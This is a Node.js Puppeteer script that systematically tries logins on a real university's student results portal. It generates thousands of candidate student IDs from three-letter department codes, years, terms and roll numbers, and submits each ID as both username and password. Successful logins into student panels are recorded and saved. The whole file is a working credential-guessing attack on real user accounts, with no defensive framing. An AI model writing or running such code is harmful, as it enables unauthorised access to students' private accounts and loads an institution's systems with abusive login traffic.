const puppeteer = require("puppeteer");
const fs = require("fs");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const years = [16, 17, 18, 19, 20, 21, 22, 23, 24, 25]; // Years to check
const terms = ["01", "03"]; // Semesters to check
const rollEnd = 20; // Check only the first 20 students
const resultsFilePath = "found_departments.json";

// Helper function to retry failed operations
const retry = async (fn, retries = 3, delay = 1500) => {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (i === retries - 1) throw err;
            // console.warn(`⚠️ Retry ${i + 1} due to: ${err.message}`);
            await new Promise(res => setTimeout(res, delay));
        }
    }
};

// Main function
(async () => {
    console.log("🚀 Launching browser...");
    const browser = await puppeteer.launch({ headless: true });

    let foundDepartments = [];
    // Load previous results if the file exists
    if (fs.existsSync(resultsFilePath)) {
        foundDepartments = JSON.parse(fs.readFileSync(resultsFilePath, "utf-8"));
        console.log(`✅ Loaded ${foundDepartments.length} previously found departments.`);
    }

    // Labeled loop to allow breaking out and continuing to the next department
    departmentLoop:
    for (let i = 97; i <= 122; i++) { // a-z
        for (let j = 97; j <= 122; j++) { // a-z
            for (let k = 97; k <= 122; k++) { // a-z
                const department = (String.fromCharCode(i) + String.fromCharCode(j) + String.fromCharCode(k)).toUpperCase();

                // Skip if this department has already been found in a previous run
                if (foundDepartments.some(d => d.department === department)) {
                    console.log(`⏭️  Skipping already found department: ${department}`);
                    continue;
                }

                console.log(`\n🔎 Searching department: ${department}`);

                // Search through each session for this department
                for (const year of years) {
                    for (const term of terms) {
                        const session = `${year}${term}`;

                        // Check the first 20 roll numbers
                        for (let roll = 1; roll <= rollEnd; roll++) {
                            const rollCode = `20${String(roll).padStart(3, "0")}`;
                            const userId = `${department}${session}${rollCode}`;
                            const page = await browser.newPage();
                            await page.setDefaultNavigationTimeout(20000);

                            try {
                                await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));
                                await page.type("#username", userId);
                                await page.type("#password", userId);

                                await Promise.all([
                                    page.click("button[type=submit]"),
                                    page.waitForNavigation({ waitUntil: "domcontentloaded" })
                                ]);

                                // If login is successful, the URL will change to the student panel
                                if (page.url().includes("panel")) {
                                    console.log(`✅ FOUND: Department '${department}' is valid (discovered with ID: ${userId})`);
                                    
                                    // Add to our list and save progress immediately
                                    foundDepartments.push({ department });
                                    fs.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
                                    
                                    // Logout to be safe
                                    await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
                                    await page.close();

                                    // Move to the next department code
                                    continue departmentLoop;
                                }
                            } catch (error) {
                                // Ignore login/timeout errors as they mean the ID is invalid
                            } finally {
                                if (!page.isClosed()) {
                                    await page.close();
                                }
                            }
                        } // End roll loop
                    } // End term loop
                } // End year loop
                 console.log(`❌ No students found for ${department}. Moving on.`);
            }
        }
    }

    await browser.close();

    console.log("\n\n--- DISCOVERY COMPLETE ---");
    console.log("Found the following valid departments:");
    console.table(foundDepartments);
    console.log(`Results have been saved to ${resultsFilePath}`);
})();